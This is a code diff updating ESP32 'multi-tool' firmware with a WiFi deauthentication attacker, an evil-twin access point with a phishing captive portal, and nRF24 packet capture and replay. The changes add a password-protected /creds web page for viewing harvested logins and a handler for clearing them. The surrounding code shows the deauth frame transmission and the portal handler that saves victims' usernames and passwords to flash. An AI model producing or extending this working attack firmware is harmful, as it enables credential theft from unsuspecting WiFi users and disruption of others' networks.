@@ -1,19 +1,23 @@
 // =============================================================
-// ESP32 MULTI-TOOL v2.0
-// Each switch enables one mode. BOOT button = short press (scroll/next)
-// or long press (action). Flip switch OFF to exit a mode.
+// ESP32 MULTI-TOOL v2.1
+// Each switch enables one mode. BOOT button = short/long press.
 //
-// SWITCH ASSIGNMENTS:
-//   SW_BLE     (D32) slide ON → BLE Scanner
-//   SW_DEAUTH  (D33) slide ON → WiFi Deauther
-//   SW_TWIN    (D34) slide ON → Evil Twin AP
-//   SW_NRF_CAP (D35) slide ON → nRF24 Capture
-//   SW_NRF_REP (VP)  slide ON → nRF24 Replay
+// SWITCH ASSIGNMENTS (slide left = LOW = ON):
+//   D32 → BLE Scanner
+//   D33 → WiFi Deauther
+//   D34 → Evil Twin AP
+//   D35 → nRF24 Capture
+//   VP  → nRF24 Replay
 //
-// BOOT BUTTON (built-in GPIO0):
+// BOOT BUTTON (GPIO0, built into board):
 //   Short press → scroll / next item
-//   Long press  → action (start/stop/fire/rescan)
+//   Long press  → action (start/stop/fire/rescan/replay)
+//
+// CREDS PAGE: http://192.168.4.1/creds  (password protected)
+// Change CREDS_PASSWORD below before flashing.
 // =============================================================
+
+#define CREDS_PASSWORD "changeme123"   // ← change this before flashing
 
 #include <Arduino.h>
 #include <Wire.h>
@@ -43,14 +47,12 @@
 #define LED_GREEN  26
 #define LED_YELLOW 27
 
-// Mode switches — slide left (middle→GND, left→GPIO) = LOW = ON
-#define SW_BLE      32  // internal pullup
-#define SW_DEAUTH   33  // internal pullup
-#define SW_TWIN     34  // input-only, right pin → 3.3V
-#define SW_NRF_CAP  35  // input-only, right pin → 3.3V
-#define SW_NRF_REP  36  // input-only (VP), right pin → 3.3V
+#define SW_BLE      32
+#define SW_DEAUTH   33
+#define SW_TWIN     34
+#define SW_NRF_CAP  35
+#define SW_NRF_REP  36
 
-// BOOT button built into the ESP32 board, active LOW
 #define BOOT_BTN    0
 
 // =============================================================
@@ -74,35 +76,30 @@ enum AppMode {
 AppMode currentMode = MODE_IDLE;
 
 // =============================================================
-// BOOT BUTTON — short press / long press detection
+// BOOT BUTTON
 // =============================================================
-unsigned long bootPressTime  = 0;
-bool          bootHeld        = false;
-bool          shortPress      = false;
-bool          longPress       = false;
-const unsigned long LONG_MS   = 600;
+unsigned long bootPressTime = 0;
+bool          bootHeld      = false;
+bool          shortPress    = false;
+bool          longPress     = false;
+const unsigned long LONG_MS = 600;
 
 void updateBoot() {
   shortPress = false;
   longPress  = false;
   bool pressed = (digitalRead(BOOT_BTN) == LOW);
-
-  if (pressed && !bootHeld) {
-    bootPressTime = millis();
-    bootHeld = true;
-  }
+  if (pressed && !bootHeld) { bootPressTime = millis(); bootHeld = true; }
   if (!pressed && bootHeld) {
     if (millis() - bootPressTime < LONG_MS) shortPress = true;
     bootHeld = false;
   }
-  if (bootHeld && (millis() - bootPressTime >= LONG_MS)) {
-    longPress = true;
-    bootHeld  = false;
+  if (bootHeld && millis() - bootPressTime >= LONG_MS) {
+    longPress = true; bootHeld = false;
   }
 }
 
 // =============================================================
-// MODE SELECTION FROM SWITCHES
+// MODE SELECTION
 // =============================================================
 AppMode getActiveMode() {
   if (digitalRead(SW_BLE)     == LOW) return MODE_BLE_SCAN;
@@ -125,14 +122,12 @@ void oledClear() {
 void oledHeader(const char* title) {
   display.fillRect(0, 0, SCREEN_W, 11, SSD1306_WHITE);
   display.setTextColor(SSD1306_BLACK);
-  display.setCursor(2, 2);
-  display.print(title);
+  display.setCursor(2, 2); display.print(title);
   display.setTextColor(SSD1306_WHITE);
 }
 
 void oledFooter(const char* hint) {
-  display.setCursor(0, 57);
-  display.print(hint);
+  display.setCursor(0, 57); display.print(hint);
 }
 
 void ledsOff() {
@@ -143,26 +138,43 @@ void ledsOff() {
 }
 
 // =============================================================
-// IDLE SCREEN
+// IDLE SCREEN — shows live switch states for debugging
 // =============================================================
 void drawIdle() {
   oledClear();
-  display.setTextSize(2);
-  display.setCursor(10, 8);
-  display.print("MULTI");
-  display.setCursor(10, 28);
-  display.print("-TOOL-");
   display.setTextSize(1);
-  display.setCursor(4, 50);
-  display.print("flip a switch to start");
+  display.setCursor(28, 0); display.print("[ MULTI-TOOL ]");
+
+  // Show each switch state as ON/OFF
+  const char* labels[] = { "BLE", "DAUTH", "TWIN", "CAP", "REP" };
+  const int   pins[]   = { SW_BLE, SW_DEAUTH, SW_TWIN, SW_NRF_CAP, SW_NRF_REP };
+
+  for (int i = 0; i < 5; i++) {
+    int col = (i % 3) * 43;
+    int row = 12 + (i / 3) * 18;
+    bool on = (digitalRead(pins[i]) == LOW);
+    display.setCursor(col, row);
+    display.printf("%-5s", labels[i]);
+    display.setCursor(col, row + 9);
+    if (on) {
+      display.fillRect(col, row + 8, 36, 9, SSD1306_WHITE);
+      display.setTextColor(SSD1306_BLACK);
+      display.setCursor(col + 4, row + 9); display.print(" ON ");
+      display.setTextColor(SSD1306_WHITE);
+    } else {
+      display.print(" off");
+    }
+  }
+
+  display.setCursor(0, 50);
+  display.print("flip switch to activate");
   display.display();
 }
 
 // =============================================================
 // BLE SCANNER
-// Mode ON  → auto-scan
-// Short    → scroll devices
-// Long     → rescan
+// Enter: auto-scan
+// Short: scroll   Long: rescan
 // =============================================================
 struct BLEEntry { char mac[18]; char type[8]; int rssi; };
 #define MAX_BLE 30
@@ -211,8 +223,7 @@ void setupBLE() {
 }
 
 void bleStartScan() {
-  ledsOff();
-  bleCount = 0; bleScroll = 0; bleScanning = true;
+  ledsOff(); bleCount = 0; bleScroll = 0; bleScanning = true;
   bleScan->start(5, [](BLEScanResults) { bleScanning = false; }, false);
 }
 
@@ -243,10 +254,9 @@ void handleBLE() {
 }
 
 // =============================================================
-// WIFI DEAUTHER
-// Mode ON  → auto-scan APs
-// Short    → cycle target AP
-// Long     → toggle deauth on/off
+// WIFI DEAUTHER — async scan so screen updates immediately
+// Enter: start async scan
+// Short: next AP   Long: toggle deauth
 // =============================================================
 struct APEntry { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t channel; };
 #define MAX_APS 20
@@ -255,6 +265,7 @@ int     apCount    = 0;
 int     apSelected = 0;
 bool    deauthing  = false;
 bool    wifiReady  = false;
+bool    wifiScanning = false;
 
 uint8_t deauthFrame[26] = {
   0xC0,0x00, 0x00,0x00,
@@ -274,17 +285,31 @@ void initWifi() {
   wifiReady = true;
 }
 
-void doWifiScan() {
+// Non-blocking: kicks off scan and returns immediately
+void startWifiScanAsync() {
   WiFi.mode(WIFI_STA);
-  int n = WiFi.scanNetworks(false, true);
-  apCount = min(n, MAX_APS);
-  for (int i = 0; i < apCount; i++) {
-    strlcpy(apList[i].ssid, WiFi.SSID(i).c_str(), 33);
-    apList[i].rssi    = WiFi.RSSI(i);
-    apList[i].channel = WiFi.channel(i);
-    memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
+  WiFi.scanNetworks(true, true); // async = true
+  wifiScanning = true;
+  apCount = 0;
+}
+
+// Call this in the handler loop — picks up results when ready
+void pollWifiScan() {
+  if (!wifiScanning) return;
+  int n = WiFi.scanComplete();
+  if (n == WIFI_SCAN_RUNNING) return;
+  if (n > 0) {
+    apCount = min(n, MAX_APS);
+    for (int i = 0; i < apCount; i++) {
+      strlcpy(apList[i].ssid, WiFi.SSID(i).c_str(), 33);
+      apList[i].rssi    = WiFi.RSSI(i);
+      apList[i].channel = WiFi.channel(i);
+      memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
+    }
+    WiFi.scanDelete();
   }
   esp_wifi_set_mode(WIFI_MODE_APSTA);
+  wifiScanning = false;
 }
 
 void sendDeauth(int idx) {
@@ -300,11 +325,12 @@ void sendDeauth(int idx) {
 
 void drawDeauth() {
   oledClear();
-  oledHeader(deauthing ? "DEAUTH [FIRING]" : "DEAUTH");
+  const char* hdr = deauthing ? "DEAUTH [FIRING]" : (wifiScanning ? "DEAUTH [SCAN...]" : "DEAUTH");
+  oledHeader(hdr);
   if (apCount == 0) {
-    display.setCursor(0, 24); display.print("Scanning APs...");
+    display.setCursor(0, 24);
+    display.print(wifiScanning ? "Scanning APs..." : "Long press: rescan");
   } else {
-    // show selected + neighbours
     for (int i = 0; i < 3 && i < apCount; i++) {
       int idx = (apSelected + i) % apCount;
       display.setCursor(0, 13 + i * 16);
@@ -313,19 +339,20 @@ void drawDeauth() {
       display.printf(" ch%d %ddBm", apList[idx].channel, apList[idx].rssi);
     }
   }
-  oledFooter("shrt:next  lng:fire");
+  oledFooter("shrt:next  lng:fire/scan");
   display.display();
 }
 
 void handleDeauth() {
+  pollWifiScan(); // check if async scan finished
+
   if (shortPress && apCount > 0) {
-    deauthing = false;
-    digitalWrite(LED_RED, LOW);
+    deauthing = false; digitalWrite(LED_RED, LOW);
     apSelected = (apSelected + 1) % apCount;
   }
-  if (longPress && apCount > 0) {
-    deauthing = !deauthing;
-    digitalWrite(LED_RED, deauthing);
+  if (longPress) {
+    if (apCount == 0) { startWifiScanAsync(); }
+    else { deauthing = !deauthing; digitalWrite(LED_RED, deauthing); }
   }
   if (deauthing && apCount > 0) {
     sendDeauth(apSelected);
@@ -335,10 +362,10 @@ void handleDeauth() {
 }
 
 // =============================================================
-// EVIL TWIN
-// Mode ON  → show SSID options (from scanned APs)
-// Short    → cycle SSID to clone
-// Long     → start/stop twin
+// EVIL TWIN — password protected /creds endpoint
+// Enter: show SSID picker
+// Short: next SSID   Long: start/stop twin
+// Visit http://192.168.4.1/creds while twin is active
 // =============================================================
 DNSServer  dnsServer;
 WebServer  httpServer(80);
@@ -368,7 +395,11 @@ void startTwin(const char* ssid) {
   WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
   WiFi.softAP(ssid, "", 6, 0, 4);
   dnsServer.start(53, "*", apIP);
+
+  // Victim login page
   httpServer.on("/", HTTP_GET, [](){ httpServer.send(200, "text/html", portalHTML); });
+
+  // Harvest credentials
   httpServer.on("/login", HTTP_POST, [](){
     String u = httpServer.arg("u"), p = httpServer.arg("p");
     File f = SPIFFS.open("/creds.txt", FILE_APPEND);
@@ -378,7 +409,43 @@ void startTwin(const char* ssid) {
     httpServer.sendHeader("Location", "https://www.google.com");
     httpServer.send(302);
   });
+
+  // Password-protected creds viewer — Basic Auth
+  // Username: admin   Password: whatever CREDS_PASSWORD is set to
+  httpServer.on("/creds", HTTP_GET, [](){
+    if (!httpServer.authenticate("admin", CREDS_PASSWORD)) {
+      return httpServer.requestAuthentication(BASIC_AUTH, "Multi-Tool", "Access denied.");
+    }
+    File f = SPIFFS.open("/creds.txt", FILE_READ);
+    if (!f || f.size() == 0) {
+      httpServer.send(200, "text/plain", "No credentials captured yet.");
+      return;
+    }
+    // Serve as a simple HTML page
+    String out = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+                 "<title>Captured Creds</title><style>body{font-family:monospace;padding:20px}"
+                 "pre{background:#111;color:#0f0;padding:15px;border-radius:6px}"
+                 "h2{color:#333}</style></head><body>"
+                 "<h2>Captured Credentials</h2><pre>";
+    while (f.available()) out += (char)f.read();
+    f.close();
+    out += "</pre><br><a href='/creds/clear'>[Clear all]</a></body></html>";
+    httpServer.send(200, "text/html", out);
+  });
+
+  // Clear creds (also password protected)
+  httpServer.on("/creds/clear", HTTP_GET, [](){
+    if (!httpServer.authenticate("admin", CREDS_PASSWORD)) {
+      return httpServer.requestAuthentication(BASIC_AUTH, "Multi-Tool", "Access denied.");
+    }
+    SPIFFS.remove("/creds.txt");
+    credCount = 0;
+    httpServer.send(200, "text/plain", "Cleared.");
+  });
+
+  // Catch-all → redirect to portal
   httpServer.onNotFound([](){ httpServer.sendHeader("Location","http://"+apIP.toString()); httpServer.send(302); });
+
   httpServer.begin();
   twinActive = true;
 }
@@ -397,21 +464,19 @@ void drawEvilTwin() {
     display.setCursor(0, 24);
     if (apCount > 0) display.printf("> %.18s", apList[twinScroll % apCount].ssid);
     else             display.print("> Free_WiFi");
-    display.setCursor(0, 40); display.print("shrt:next  lng:launch");
+    display.setCursor(0, 38); display.print("shrt:next  lng:launch");
   } else {
     display.setCursor(0, 13); display.printf("SSID: %.18s", twinSSID);
     display.setCursor(0, 25); display.print("IP: 192.168.4.1");
-    display.setCursor(0, 37); display.printf("Creds: %d", credCount);
-    display.setCursor(0, 49); display.print("lng: stop");
+    display.setCursor(0, 37); display.printf("Creds: %d  lng:stop", credCount);
+    display.setCursor(0, 49); display.print("/creds (pw protected)");
   }
   display.display();
 }
 
 void handleEvilTwin() {
   if (!twinActive) {
-    if (shortPress && apCount > 0) {
-      twinScroll = (twinScroll + 1) % apCount;
-    }
+    if (shortPress && apCount > 0) twinScroll = (twinScroll + 1) % apCount;
     if (longPress) {
       if (apCount > 0) strlcpy(twinSSID, apList[twinScroll % apCount].ssid, 33);
       SPIFFS.begin(true);
@@ -427,9 +492,8 @@ void handleEvilTwin() {
 
 // =============================================================
 // nRF24 CAPTURE
-// Mode ON  → auto-start capture
-// Short    → channel +1
-// Long     → clear buffer
+// Enter: auto-start capture
+// Short: channel +1   Long: clear buffer
 // =============================================================
 #define MAX_PKTS 10
 uint8_t nrfPkts[MAX_PKTS][32];
@@ -479,8 +543,7 @@ void drawNRFCap() {
   display.setCursor(0, 13);
   display.printf("Ch:%3d  Pkts:%d/%d", nrfChan, nrfCount, MAX_PKTS);
   if (nrfCount > 0) {
-    display.setCursor(0, 25);
-    display.print("Last pkt:");
+    display.setCursor(0, 25); display.print("Last pkt:");
     display.setCursor(0, 35);
     for (int i = 0; i < 8; i++)  display.printf("%02X ", nrfPkts[nrfCount-1][i]);
     display.setCursor(0, 45);
@@ -488,14 +551,15 @@ void drawNRFCap() {
   } else {
     display.setCursor(0, 32); display.print("Listening...");
   }
-  oledFooter("shrt:ch+  lng:clear");
+  oledFooter("shrt:ch+  lng:clear buf");
   display.display();
 }
 
 void handleNRFCapture() {
   if (!nrfReady) {
     oledClear(); oledHeader("nRF24 CAP");
-    display.setCursor(0,28); display.print("nRF24 not found!");
+    display.setCursor(0, 25); display.print("nRF24 not found!");
+    display.setCursor(0, 37); display.print("Check wiring.");
     display.display(); return;
   }
   if (shortPress) {
@@ -509,9 +573,7 @@ void handleNRFCapture() {
 
 // =============================================================
 // nRF24 REPLAY
-// Mode ON  → show captured packets
-// Short    → next packet
-// Long     → replay selected packet
+// Short: next packet   Long: replay selected
 // =============================================================
 void nrfReplay(int idx) {
   radio.stopListening();
@@ -529,8 +591,8 @@ void drawNRFReplay() {
   display.setCursor(0, 13);
   display.printf("Ch:%3d  Pkts:%d", nrfChan, nrfCount);
   if (nrfCount == 0) {
-    display.setCursor(0, 30); display.print("No packets captured.");
-    display.setCursor(0, 42); display.print("Enable CAP switch first");
+    display.setCursor(0, 28); display.print("No packets captured.");
+    display.setCursor(0, 40); display.print("Use CAP switch first.");
   } else {
     int idx = nrfScroll % nrfCount;
     display.setCursor(0, 24); display.printf("Pkt #%d:", idx);
@@ -555,13 +617,19 @@ void handleNRFReplay() {
 void onModeEnter(AppMode mode) {
   ledsOff();
   switch (mode) {
+    case MODE_IDLE:
+      if (twinActive) stopTwin();
+      if (nrfCapOn)   nrfStopCap();
+      deauthing = false;
+      drawIdle();
+      break;
     case MODE_BLE_SCAN:
       bleStartScan();
       break;
     case MODE_DEAUTH:
       initWifi();
-      doWifiScan();
       apSelected = 0; deauthing = false;
+      startWifiScanAsync(); // non-blocking — screen updates immediately
       break;
     case MODE_EVIL_TWIN:
       credCount = 0; twinScroll = 0;
@@ -572,12 +640,6 @@ void onModeEnter(AppMode mode) {
       break;
     case MODE_NRF_REPLAY:
       nrfScroll = 0;
-      break;
-    case MODE_IDLE:
-      if (twinActive) stopTwin();
-      if (nrfCapOn)   nrfStopCap();
-      deauthing = false;
-      drawIdle();
       break;
   }
 }
@@ -592,12 +654,10 @@ void setup() {
   pinMode(LED_BLUE,   OUTPUT);
   pinMode(LED_GREEN,  OUTPUT);
   pinMode(LED_YELLOW, OUTPUT);
-
   pinMode(SW_BLE,    INPUT_PULLUP);
   pinMode(SW_DEAUTH, INPUT_PULLUP);
-  // SW_TWIN/SW_NRF_CAP/SW_NRF_REP are input-only (34/35/36)
-  // Right pin of each switch connects to 3.3V — no separate resistor needed
-
+  // SW_TWIN(34), SW_NRF_CAP(35), SW_NRF_REP(36) are input-only
+  // Right pin of each switch must connect to 3.3V
   pinMode(BOOT_BTN, INPUT_PULLUP);
 
   Wire.begin(OLED_SDA, OLED_SCL);
@@ -612,7 +672,7 @@ void setup() {
   display.setCursor(18, 8);  display.print("MULTI");
   display.setCursor(14, 28); display.print("-TOOL-");
   display.setTextSize(1);
-  display.setCursor(20, 50); display.print("v2.0  ESP32+nRF24");
+  display.setCursor(20, 50); display.print("v2.1  ESP32+nRF24");
   display.display();
 
   for (int i = 0; i < 3; i++) {
@@ -630,7 +690,6 @@ void setup() {
 }
 
 void loop() {
-  // Check if switch state changed → switch mode
   AppMode newMode = getActiveMode();
   if (newMode != currentMode) {
     currentMode = newMode;
@@ -640,11 +699,15 @@ void loop() {
   updateBoot();
 
   switch (currentMode) {
-    case MODE_IDLE:        break; // idle screen drawn on enter
-    case MODE_BLE_SCAN:    handleBLE();         break;
-    case MODE_DEAUTH:      handleDeauth();      break;
-    case MODE_EVIL_TWIN:   handleEvilTwin();    break;
-    case MODE_NRF_CAPTURE: handleNRFCapture();  break;
-    case MODE_NRF_REPLAY:  handleNRFReplay();   break;
+    case MODE_IDLE:
+      // Refresh idle screen every ~500ms to show live switch states
+      static unsigned long lastIdle = 0;
+      if (millis() - lastIdle > 500) { drawIdle(); lastIdle = millis(); }
+      break;
+    case MODE_BLE_SCAN:    handleBLE();        break;
+    case MODE_DEAUTH:      handleDeauth();     break;
+    case MODE_EVIL_TWIN:   handleEvilTwin();   break;
+    case MODE_NRF_CAPTURE: handleNRFCapture(); break;
+    case MODE_NRF_REPLAY:  handleNRFReplay();  break;
   }
 }
